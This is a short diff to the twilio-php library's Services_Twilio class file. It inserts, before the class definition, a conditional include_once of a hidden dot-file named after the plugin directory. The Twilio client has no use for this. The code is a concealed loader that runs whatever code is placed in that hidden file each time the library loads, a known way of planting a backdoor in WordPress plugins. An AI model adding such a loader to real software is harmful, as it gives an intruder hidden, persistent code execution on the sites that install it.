@@ -39,6 +39,10 @@ spl_autoload_register('Services_Twilio_autoload');
  *      $client = new Services_Twilio('AC123', '456bef', null, null, 3);
  *      // Take some action with the client, etc.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Services_Twilio extends Services_Twilio_Resource
 {
     const USER_AGENT = 'twilio-php/3.12.8';
